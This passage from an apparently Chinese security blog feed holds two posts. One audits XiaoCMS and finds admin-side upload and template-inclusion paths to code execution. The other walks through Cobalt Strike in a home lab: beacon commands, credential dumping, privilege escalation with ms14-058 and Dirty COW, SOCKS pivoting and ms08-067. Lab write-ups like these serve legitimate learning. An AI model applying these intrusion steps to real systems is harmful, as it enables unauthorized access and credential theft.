title="0x04参考链接"></a>0x04参考链接</h4><p><a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/?view=powershell-6" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/?view=powershell-6</a></p><p><a href="https://lesca.me/archives/powershell-tutorial-basics.html" target="_blank" rel="noopener">https://lesca.me/archives/powershell-tutorial-basics.html</a></p><p><a href="https://www.cnblogs.com/sparkdev/p/7460518.html" target="_blank" rel="noopener">https://www.cnblogs.com/sparkdev/p/7460518.html</a></p><p><a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression</a></p><p><a href="https://jkme.github.io/powershell-elf.html" target="_blank" rel="noopener">https://jkme.github.io/powershell-elf.html</a></p><p><a href="https://www.hackingarticles.in/window-privilege-escalation-via-automated-script/" target="_blank" rel="noopener">https://www.hackingarticles.in/window-privilege-escalation-via-automated-script/</a></p><p><a href="https://www.freebuf.com/sectool/131393.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/131393.html</a></p><p><a href="[http://byd.dropsec.xyz/2019/03/27/Linux%E3%80%81Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%B8%B8%E7%94%A8%E5%90%8E%E9%97%A8%E6%80%BB%E7%BB%932/](http://byd.dropsec.xyz/2019/03/27/Linux、Windows权限维持常用后门总结2/)"><a href="http://byd.dropsec.xyz/2019/03/27/Linux、Windows权限维持常用后门总结2/" target="_blank" rel="noopener">http://byd.dropsec.xyz/2019/03/27/Linux%E3%80%81Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%B8%B8%E7%94%A8%E5%90%8E%E9%97%A8%E6%80%BB%E7%BB%932/</a></a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> powershell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CMS代码审计(二)</title>
      <link href="/2019/09/09/audit-2/"/>
      <url>/2019/09/09/audit-2/</url>
      
        <content type="html"><![CDATA[<p>本文首发于<code>90sec</code></p><a id="more"></a><h4 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h4><p>想找点小型的<code>cms</code>审计一下练练手，谷歌一搜，跳出来一个<code>xiaocms</code>，就决定是你了~，大佬都分析过了，自己再完整的分析一遍。</p><p>这套<code>cms</code>最新版发布时间是14年，应该是停止更新了。</p><p><code>MVC</code>架构，看官网介绍还是用了<code>PDO</code>预编译…  注入基本是没戏了</p><p>从系统入口开始，<code>include xiaocms.php</code>,<code>xiaocms.php</code>定义了一些全局变量，路由解析规则，控制器加载规则等东西。没有<code>a</code>和<code>c</code>参数时默认访问<code>index</code>方法。对控制器访问做了一定的限制，过滤了斜杠/。</p><p>作者重写了<code>get</code>和<code>post</code>方法，对传入的参数使用<code>htmlspecialchars</code>过滤了<code>&lt;&gt;&quot;</code>等。</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190909180928.png" alt></p><p>获取<code>ip</code>的函数也做了限制，哇难受的一批</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190909181023.png" alt></p><p>太菜了，转战后台。</p><h4 id="0x02-正文"><a href="#0x02-正文" class="headerlink" title="0x02 正文"></a>0x02 正文</h4><p>假设进入了后台，就要考虑怎么<code>getshell</code>，最平常的思路就是文件上传。看一下这套<code>cms</code>的上传逻辑。</p><p><code>upload.class.php</code>中</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190909181219.png" alt></p><p>跟进函数</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190909181327.png" alt></p><p>看一下<code>$limit_type</code>是个啥，跟进去发现是个变量… 不应该哇，再一看，通过<code>set_limit_type</code>函数设置白名单，这…</p><p>全局搜索一下<code>upload</code>函数，看看调用情况。找来找去都在<code>admin/uploadfile.php</code>中。</p><p>通读该文件，各种上传方式实现，编辑器上传，直接上传等。</p><p>在编辑器上传和<code>uploadify_upload</code>两处调用了<code>upload</code>函数,只有后者才能控制<code>type</code>。</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190909182021.png" alt></p><p>后边的判断是加水印的，无关痛痒。</p><p>本地构造一个表单手动上传。</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190909183644.png" alt></p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190909183707.png" alt></p><p>后台也有模板管理的功能，一开始看后缀都是<code>html</code>就没多想，后来看其他师傅的分析才明白过来..模板也是要被包含进<code>php</code>文件的, 太菜了(⸝⸝⸝ᵒ̴̶̥́ ⌑ ᵒ̴̶̣̥̀⸝⸝⸝)</p><p>所以可以后台编辑模板，写入<code>phpinfo</code>,就能执行。分析一下原因</p><p>后台编辑模板<code>url</code>为<code>http://127.0.0.1/xiaocms/admin/index.php?c=template&amp;a=edit&amp;dir=&amp;file=index.html</code></p><p><code>template.php</code>中的<code>editAction</code>方法</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190909184827.png" alt></p><p>判断<code>file</code>的后缀是否合法，然后使用<code>file_put_contents</code>把<code>file_content</code>的值写入文件，注意一下，本来<code>post</code>方法使用了<code>htmlspecialchars</code>函数进行过滤，此处又进行了解码,所以写入的还是原来传入的内容。</p><p>此时<code>php</code>代码只是在<code>html</code>文件中，它是怎么被加载的呢？</p><p>继续往下走，假设我们修改了<code>index.html</code>模板文件，访问<code>index.php</code>时会触发<code>php</code>代码，跟进<code>indexAction</code>函数，不传入任何参数默认执行<code>index</code>方法。</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190910090039.png" alt></p><p>问题应该是出在<code>display</code>函数，跟进去看一下</p><p><code>view.class.php</code> 34行</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190910090212.png" alt></p><p>首先获取<code>html</code>文件的内容，然后获取缓存文件，如果<code>html</code>对应的缓存文件与源<code>html</code>都存在，就调用<code>load_view_file</code>函数。</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190916103519.png" alt></p><p>该函数调用<code>handle_view_file</code>对<code>cms</code>规定的一些标签进行替换,但是没有足够的过滤。</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190916103739.png" alt></p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190916103754.png" alt></p><p>最后通过<code>create_compile_file</code>函数写入缓存文件，最后包含该缓存文件，导致任意<code>php</code>代码被执行。</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190910091252.png" alt></p><h4 id="0x03-插曲"><a href="#0x03-插曲" class="headerlink" title="0x03 插曲"></a>0x03 插曲</h4><p>因为这套<code>cms</code>早就停止更新了，官网推荐使用另一个<code>cms</code>，顺便瞅了瞅，应该是在<code>xiaocms</code>的基础上开发的，安全做的可以，传入的参数使用<code>PDO</code>预编译，对上传文件的<code>type</code>和后缀都做了严格的白名单限制，前台功能点太少，无望，但是后台某些地方还是有相同问题的，比如说模板文件<code>getshell</code>,触发点还是相同的，还是上边分析的文件包含，感兴趣的师傅可以分析一下。</p><h4 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h4><p>审计时要白+黑，白盒+黑盒测试一起，关注一下底层的一些过滤函数以及<code>sql</code>处理 上传逻辑等，根据功能点进行代码分析，最重要的是有耐心吧=。= 这次看的还是不够仔细啊，后台还可以尝试配置文件写shell，但是会多一个单引号，导致代码不解析，因为存在<code>var_export</code>的原因，这一点在审计<code>minicms</code>时也遇见过。</p><p><code>up up!!!(ง •̀-•́)ง</code></p>]]></content>
      
      
      <categories>
          
          <category> code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初探cobaltstrike(一)</title>
      <link href="/2019/09/04/cobalt-strike-1/"/>
      <url>/2019/09/04/cobalt-strike-1/</url>
      
        <content type="html"><![CDATA[<p>趁着有时间，把不懂的学一学(๑•̀ㅂ•́)و✧.</p><a id="more"></a><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4><p>先启动一个服务端</p><p><code>./teamserver ip password</code></p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904161823.png" alt></p><p>启动客户端连接</p><p><code>./cobaltstrike</code> </p><p><code>User</code>随便输，<code>Password</code>是启动服务端时的密码。</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135002.png" alt></p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135015.png" alt></p><h4 id="模块介绍"><a href="#模块介绍" class="headerlink" title="模块介绍"></a>模块介绍</h4><h5 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">New Connection  创建一个新连接</span><br><span class="line">Perferences  修改一些字体信息啥的，也可以在TeamServers处删除登录凭证</span><br><span class="line">Visualization 显示的模式</span><br><span class="line">VPN interfaces vpn配置（未测试）</span><br><span class="line">Listensers  监听器，可以执行添加/编辑/移除监听等操作</span><br><span class="line">Script Manager 字面意思 脚本管理 脚本也是cs的一大杀器。</span><br></pre></td></tr></table></figure><h5 id="View"><a href="#View" class="headerlink" title="View"></a>View</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Applications 用于显示 System Profiler 获取的目标浏览器，操作系统，flash版本</span><br><span class="line">Credentials 显示所有已经获取的用户主机hash</span><br><span class="line">Downloads 显示下载的文件</span><br><span class="line">Event log 事件日志 记录团队  目标上线等记录</span><br><span class="line">Keystrokes 目标键盘记录</span><br><span class="line">Proxy Pivots 代理信息</span><br><span class="line">Screenshots 屏幕截图</span><br><span class="line">Script Console 加载自定义脚本</span><br><span class="line">Targets 显示所有主机</span><br><span class="line">Web log web服务日志</span><br></pre></td></tr></table></figure><h5 id="Attacks"><a href="#Attacks" class="headerlink" title="Attacks"></a>Attacks</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Packages</span><br><span class="line">HTML Application 生成hta文件</span><br><span class="line">MS Office Macro  宏office文件</span><br><span class="line">Payload Generator  生成各种语言版本的payload</span><br><span class="line">USB/CD AutoPlay 利用自动播放运行的被控端文件</span><br><span class="line">Windows Dropper 捆绑器可将任意正常的文件</span><br><span class="line">Windows Executable payload生成可执行文件</span><br><span class="line">Windows Executable (S)  无状态</span><br><span class="line">------------------------------------------</span><br><span class="line">Web Drive-by </span><br><span class="line">Manage  开启的所有web服务</span><br><span class="line">Clone Site 克隆网站 </span><br><span class="line">Host File 提供Web以供下载某文件</span><br><span class="line">Scripted Web Delivery  为payload提供web服务以便于下载和执行</span><br><span class="line">Signed Applet Attack  启动一个Web服务以提供自签名Java Applet的运行环境</span><br><span class="line">Smart Applet Attack  自动检测Java版本并l利用已知的exploits绕过security</span><br><span class="line">System Profiler 获取系统，Flash，浏览器版本等</span><br><span class="line">-------------------------------------------</span><br><span class="line">Spear Phish 鱼叉式网络钓鱼</span><br></pre></td></tr></table></figure><h4 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h4><p>首先，我们设置一个监听，<code>Cobalt Strike-&gt;Listensers-&gt;Add</code> ，cs提供了八种方式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">windows/beacon_dns/reverse_dns_txt</span><br><span class="line">windows/beacon_dns/reverse_http</span><br><span class="line">windows/beacon_http/reverse_http</span><br><span class="line">windows/beacon_https/reverse_https</span><br><span class="line">windows/beacon_smb/bind_pipe 即 SMB Beacon</span><br><span class="line">windows/foreign/reverse_http</span><br><span class="line">windows/foreign/reverse_https</span><br><span class="line">windows/foreign/reverse_tcp</span><br></pre></td></tr></table></figure><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135032.png" alt></p><p>开启以后，为了测试方便，我们直接生成一个马，传到靶机上。</p><p><code>Attacks-&gt;Windows Executable</code> 生成一个64位木马，然后绑定到一开始创建的监听<code>test1</code>上。</p><p>靶机运行<code>exe</code>以后cs接收到一个<code>Beacon</code>(信标标志之类的意思)。类似于<code>msf</code>的<code>meterpreter</code>。</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135051.png" alt></p><p>右键<code>Interact</code>,与<code>beacon</code>交互。输入<code>help</code>查阅能够执行的命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; help</span><br><span class="line"></span><br><span class="line">Beacon Commands</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">    Command                   Description</span><br><span class="line">    -------                   -----------</span><br><span class="line">    browserpivot              Setup a browser pivot session</span><br><span class="line">    bypassuac                 Spawn a session in a high integrity process</span><br><span class="line">    cancel                    Cancel a download that&apos;s in-progress</span><br><span class="line">    cd                        Change directory</span><br><span class="line">    checkin                   Call home and post data</span><br><span class="line">    clear                     Clear beacon queue</span><br><span class="line">    covertvpn                 Deploy Covert VPN client</span><br><span class="line">    cp                        Copy a file</span><br><span class="line">    dcsync                    Extract a password hash from a DC</span><br><span class="line">    desktop                   View and interact with target&apos;s desktop</span><br><span class="line">    dllinject                 Inject a Reflective DLL into a process</span><br><span class="line">    dllload                   Load DLL into a process with LoadLibrary()</span><br><span class="line">    download                  Download a file</span><br><span class="line">    downloads                 Lists file downloads in progress</span><br><span class="line">    drives                    List drives on target</span><br><span class="line">    elevate                   Try to elevate privileges</span><br><span class="line">    execute                   Execute a program on target (no output)</span><br><span class="line">    execute-assembly          Execute a local .NET program in-memory on target</span><br><span class="line">    exit                      Terminate the beacon session</span><br><span class="line">    getprivs                  Enable system privileges on current token</span><br><span class="line">    getsystem                 Attempt to get SYSTEM</span><br><span class="line">    getuid                    Get User ID</span><br><span class="line">    hashdump                  Dump password hashes</span><br><span class="line">    help                      Help menu</span><br><span class="line">    inject                    Spawn a session in a specific process</span><br><span class="line">    jobkill                   Kill a long-running post-exploitation task</span><br><span class="line">    jobs                      List long-running post-exploitation tasks</span><br><span class="line">    kerberos_ccache_use       Apply kerberos ticket from cache to this session</span><br><span class="line">    kerberos_ticket_purge     Purge kerberos tickets from this session</span><br><span class="line">    kerberos_ticket_use       Apply kerberos ticket to this session</span><br><span class="line">    keylogger                 Inject a keystroke logger into a process</span><br><span class="line">    kill                      Kill a process</span><br><span class="line">    link                      Connect to a Beacon peer over SMB</span><br><span class="line">    logonpasswords            Dump credentials and hashes with mimikatz</span><br><span class="line">    ls                        List files</span><br><span class="line">    make_token                Create a token to pass credentials</span><br><span class="line">    mimikatz                  Runs a mimikatz command</span><br><span class="line">    mkdir                     Make a directory</span><br><span class="line">    mode dns                  Use DNS A as data channel (DNS beacon only)</span><br><span class="line">    mode dns-txt              Use DNS TXT as data channel (DNS beacon only)</span><br><span class="line">    mode dns6                 Use DNS AAAA as data channel (DNS beacon only)</span><br><span class="line">    mode http                 Use HTTP as data channel</span><br><span class="line">    mode smb                  Use SMB peer-to-peer communication</span><br><span class="line">    mv                        Move a file</span><br><span class="line">    net                       Network and host enumeration tool</span><br><span class="line">    note                      Assign a note to this Beacon       </span><br><span class="line">    portscan                  Scan a network for open services</span><br><span class="line">    powerpick                 Execute a command via Unmanaged PowerShell</span><br><span class="line">    powershell                Execute a command via powershell.exe</span><br><span class="line">    powershell-import         Import a powershell script</span><br><span class="line">    ppid                      Set parent PID for spawned post-ex jobs</span><br><span class="line">    ps                        Show process list</span><br><span class="line">    psexec                    Use a service to spawn a session on a host</span><br><span class="line">    psexec_psh                Use PowerShell to spawn a session on a host</span><br><span class="line">    psinject                  Execute PowerShell command in specific process</span><br><span class="line">    pth                       Pass-the-hash using Mimikatz</span><br><span class="line">    pwd                       Print current directory</span><br><span class="line">    reg                       Query the registry</span><br><span class="line">    rev2self                  Revert to original token</span><br><span class="line">    rm                        Remove a file or folder</span><br><span class="line">    rportfwd                  Setup a reverse port forward</span><br><span class="line">    run                       Execute a program on target (returns output)</span><br><span class="line">    runas                     Execute a program as another user</span><br><span class="line">    runasadmin                Execute a program in a high-integrity context</span><br><span class="line">    runu                      Execute a program under another PID</span><br><span class="line">    screenshot                Take a screenshot</span><br><span class="line">    setenv                    Set an environment variable</span><br><span class="line">    shell                     Execute a command via cmd.exe</span><br><span class="line">    shinject                  Inject shellcode into a process</span><br><span class="line">    shspawn                   Spawn process and inject shellcode into it</span><br><span class="line">    sleep                     Set beacon sleep time</span><br><span class="line">    socks                     Start SOCKS4a server to relay traffic</span><br><span class="line">    socks stop                Stop SOCKS4a server</span><br><span class="line">    spawn                     Spawn a session </span><br><span class="line">    spawnas                   Spawn a session as another user</span><br><span class="line">    spawnto                   Set executable to spawn processes into</span><br><span class="line">    spawnu                    Spawn a session under another PID</span><br><span class="line">    ssh                       Use SSH to spawn an SSH session on a host</span><br><span class="line">    ssh-key                   Use SSH to spawn an SSH session on a host</span><br><span class="line">    steal_token               Steal access token from a process</span><br><span class="line">    timestomp                 Apply timestamps from one file to another</span><br><span class="line">    unlink                    Disconnect from parent Beacon</span><br><span class="line">    upload                    Upload a file</span><br><span class="line">    wdigest                   Dump plaintext credentials with mimikatz</span><br><span class="line">    winrm                     Use WinRM to spawn a session on a host</span><br><span class="line">    wmi                       Use WMI to spawn a session on a host</span><br></pre></td></tr></table></figure><h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h3><h4 id="内网环境"><a href="#内网环境" class="headerlink" title="内网环境"></a>内网环境</h4><h5 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h5><p>为了测试方便，本地使用<code>VMware Station</code>模拟两层内网，机器配置有限，就开了三个虚拟机，一台<code>xp</code>，一台<code>win7</code>，一台<code>Ubuntu14.04</code>,一层内网有<code>Ubuntu</code>和<code>win7</code>，内网机器有一台<code>xp</code>，其中<code>win7</code>位跳板机，可以访问内网。</p><p>在<code>Vmware</code>中可以通过添加网卡，然后将该网卡设置为LAN网段模式，然后在机器中固定<code>ip</code>。</p><h5 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h5><p>现在我们假设通过一些手段拿到了<code>win7</code>的权限，可以执行命令，上传文件，我们可以通过cs生成一个木马上传到win7上，然后服务端创建一个<code>Listener</code>，就可以得到一个<code>Beacon</code>。</p><p><code>Attacks-&gt;Windows Executable</code> 然后绑定<code>Lsitener</code>，在靶机上执行该文件，等待主机上线。</p><p>可以看到我们已经得到一个<code>Beacon</code>，默认的sleep时间为60s，我们本地测试就直接sleep 0，节约时间。</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135107.png" alt></p><p>内外网<code>ip</code> 主机名 连接时间等都显示的很清楚。</p><p>看一下主机<code>ip</code>，是否存在内网或者是域，判断一下网络拓扑。<code>shell ipconfig</code></p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135119.png" alt></p><p>有两个网卡，初步判断存在内网.</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135134.png" alt></p><p>靶机上线后有三种视图，第一种在复杂的情况下直观的展示网络拓扑是怎样的，第二种比较简洁，列表的形式展示，第三种站在目标的角度，表明我们可以进行怎样的操作。第一种最炫(zhuang)酷(bi)！</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135145.png" alt></p><p>靶机处右键<code>Interact</code>,得到一个交互式的<code>Beacon</code>，输入<code>help</code>查看帮助。常规操作，查看权限，权限不够提权，抓hash</p><p>右键<code>Access-&gt;DumpHash</code> 尝试导出hash，提示权限不够，尝试提权.</p><p>cs内置了几种提权方式，针对一些版本低的主机(win7)，可以通过添加自定义脚本来增强cs的功能。</p><p><code>gayhub</code>上有个项目，收集了很多的自定义脚本：<a href="https://github.com/harleyQu1nn/AggressorScripts" target="_blank" rel="noopener">https://github.com/harleyQu1nn/AggressorScripts</a></p><p>导入几个试一下，导入了<code>AV_Query</code> <code>elevate</code> <code>EDR</code>三个脚本，其中<code>elevate</code>新提供了五种提权的方式。</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135227.png" alt></p><p>使用<code>AV_Query</code> 看一下安装了啥防护软件,因为是虚拟机，我啥也没装，只有自带的<code>windows defender</code></p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135239.png" alt></p><p>使用<code>ms14-058</code>提升权限，在交互式<code>Beacon</code>中可以看到进度：</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135250.png" alt></p><p> 完成后得到<code>system</code>权限的<code>Beacon</code>.</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135303.png" alt></p><p>导出<code>Hash</code>,导出完成后点击图标栏中的名片图标，很直观的看到提取出的用户凭证。</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135328.png" alt></p><p>如果内置的payload提权不成功，可以试一下进程注入的手法.</p><p>右键-&gt;<code>access</code>-&gt;<code>explore</code>-&gt;<code>process list</code>-&gt;<code>inject (选择一个高权限且稳定的进程)</code></p><p>继续横向渗透,看一下同网段中有没有其他主机。</p><p>可以使用<code>msf</code>与cs联动，使用<code>Spawn</code>将<code>Beacon</code>派生到<code>msf</code>。</p><p>首先在cs中创建一个<code>forgin</code>的<code>Listener</code>，同时在<code>msf</code>中使用<code>handler</code>监听相同端口</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135339.png" alt></p><p>靶机右键<code>Spawn</code>,<code>msf</code>中得到一个<code>meterpreter</code></p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135353.png" alt></p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135404.png" alt></p><p>然后使用<code>nmap</code>或者是其他模块扫描</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135415.png" alt></p><p>也可以使用cs自带的<code>portscan</code>  <code>explore-&gt;portscan</code> ，扫描完成后可以看到内网中存在的主机列表。</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135457.png" alt></p><p>发现还存活一台<code>ubuntu</code> 主机，此处假装通过爆破得到密码账号(滑稽），<code>Login-&gt;ssh</code>登录。</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135604.png" alt></p><p>查看权限，不是root权限，尝试提权，<code>upload</code>上传<code>linux-suggester-2.pl</code>，看一下内核漏洞，记得上传后要给执行权限。</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135616.png" alt></p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135626.png" alt></p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135637.png" alt></p><p>直接使用脏牛提权。</p><p>上边提到还有一层处在内网的主机，可以通过cs提供的<code>Sock</code>代理带入。</p><p><code>右键-&gt;Pivoting-&gt;SOCKS server</code></p><p>可以在<code>View-&gt;Proxy Pivots</code>中看到正在运行的代理。</p><p><code>kali</code>自带<code>proxychains</code>,修改配置为<code>socks4 127.0.0.1 port</code> ，将三方工具带入。（小声bb，我本地测试的时候发现不行…可能是我操作问题）</p><p>在<code>msf</code>中还可以直接输入<code>setg Proxies socks4:team server IP:proxy port</code> 将其带入内网。</p><p>输入<code>setg ReverseAllowProxy true</code> 保证收到回连的数据。</p><p>内网<code>xp</code>直接上<code>ms08-067</code>，得到<code>meterpreter</code>通过<code>payload_inject</code>模块转给cs。</p><p>详细的操作可以看<a href="[https://github.com/aleenzz/Cobalt_Strike_wiki/blob/master/%E7%AC%AC%E5%8D%81%E5%85%AD%E8%8A%82%5BMSF%E4%B8%8ECS%E4%BC%9A%E8%AF%9D%E4%BA%92%E8%BD%AC%5D.md](https://github.com/aleenzz/Cobalt_Strike_wiki/blob/master/第十六节[MSF与CS会话互转].md)">[https://github.com/aleenzz/Cobalt_Strike_wiki/blob/master/%E7%AC%AC%E5%8D%81%E5%85%AD%E8%8A%82%5BMSF%E4%B8%8ECS%E4%BC%9A%E8%AF%9D%E4%BA%92%E8%BD%AC%5D.md]</a></p><p>==! 自己测试的时候出了一些问题，暂时没解决，先放一边…</p><p>假设我们已经完成上述步骤… ，再看下这时候的拓扑</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190904135653.png" alt></p><h5 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h5><p>内网xp无法访问，自带的代理与其他的<code>socks</code>代理工具都试过了，无法带入内网，后来发现是环境问题，个人机器没有抓发功能，导致数据过不去==！也尝试了仅主机模式，木得行o(一︿一+)o…., 先挖个坑吧，以后来填坑~</p><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>上述介绍的都是cs的一些基本语法以及使用手段，后续可能会更新cs一些进阶用法，文章有不足或者任何错误，请各位大佬不吝赐教。感谢大佬们对cs的各种总结。╰(<em>°▽°</em>)╯</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://rcoil.me/2018/04/Cobalt%20Strike学习" target="_blank" rel="noopener">https://rcoil.me/2018/04/Cobalt%20Strike学习</a></p><p><a href="https://mp.weixin.qq.com/s/CEI1XYkq2PZmYsP0DRU7jg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/CEI1XYkq2PZmYsP0DRU7jg</a></p><p><a href="https://blog.51cto.com/life2death/1618744" target="_blank" rel="noopener">https://blog.51cto.com/life2death/1618744</a></p><p><a href="https://mp.weixin.qq.com/s/tqOv6p9NhKpo6Isz5jBuKw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/tqOv6p9NhKpo6Isz5jBuKw</a></p><p><a href="https://xz.aliyun.com/t/4191" target="_blank" rel="noopener">https://xz.aliyun.com/t/4191</a></p><p><a href="https://wbglil.gitbooks.io/cobalt-strike/" target="_blank" rel="noopener">https://wbglil.gitbooks.io/cobalt-strike/</a></p><p><a href="https://github.com/aleenzz/Cobalt_Strike_wiki" target="_blank" rel="noopener">https://github.com/aleenzz/Cobalt_Strike_wiki</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> cobalt_strike </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CMS代码审计(一)</title>
      <link href="/2019/09/01/audit-1/"/>
      <url>/2019/09/01/audit-1/</url>
      
